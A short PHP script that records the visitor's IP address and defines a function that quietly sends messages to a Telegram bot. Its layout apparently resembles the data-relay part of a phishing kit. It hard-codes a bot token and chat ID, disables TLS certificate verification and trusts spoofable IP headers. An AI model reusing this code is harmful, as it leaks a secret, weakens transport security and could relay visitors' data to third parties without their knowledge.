<?php
// ============================================================
// Enable error logging (no screen output, so headers work)
// ============================================================
error_reporting(E_ALL);
ini_set('display_errors', 0);          // don't show on screen
ini_set('log_errors', 1);
ini_set('error_log', '/tmp/php_errors.log');

session_start();

// ============================================================
// Your constants (hardcoded – consider env vars later)
// ============================================================
define("TOKEN", '8712281940:AAF7RQkUscdeFPocXnJj8-Db7sxeU4L2AiU');
define("CHAT_ID", '-5537888304');

// ============================================================
// Helper: get user IP
// ============================================================
function get_user_ip()
{
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }
    if ($ip == '::1') {
        return '127.0.0.1';
    }
    return $ip;
}

// ============================================================
// Send message to Telegram with robust cURL + logging (no echo)
// ============================================================
function telegram_message($message, $keyboard = null)
{
    // --- 1. Check if cURL is available --------------------------------
    if (!function_exists('curl_init')) {
        error_log('cURL extension is not loaded in this PHP environment.');
        return false;
    }

    // --- 2. Prepare the data array ------------------------------------
    $data = [
        'chat_id' => CHAT_ID,
        'text'    => $message,
    ];
    if (!empty($keyboard)) {
        $data['reply_markup'] = $keyboard;
    }

    // --- 3. Build the URL ---------------------------------------------
    $url = "https://api.telegram.org/bot" . TOKEN . "/sendMessage";

    // --- 4. Initialize cURL -------------------------------------------
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    // --- 5. Execute and capture errors --------------------------------
    $result = curl_exec($ch);
    $curl_error = curl_error($ch);
    $curl_errno = curl_errno($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // --- 6. Log everything (NO echo, just logs) ----------------------
    error_log("Telegram API call - HTTP code: $http_code");
    if ($curl_errno) {
        error_log("cURL error ($curl_errno): $curl_error");
        return false;
    } else {
        error_log("Telegram response: " . $result);
        return $result;
    }
}

// ============================================================
// Your actual logic (uncomment/use as needed)
// ============================================================
$ip = get_user_ip();
$random_class = rand(0, 1000000);


?>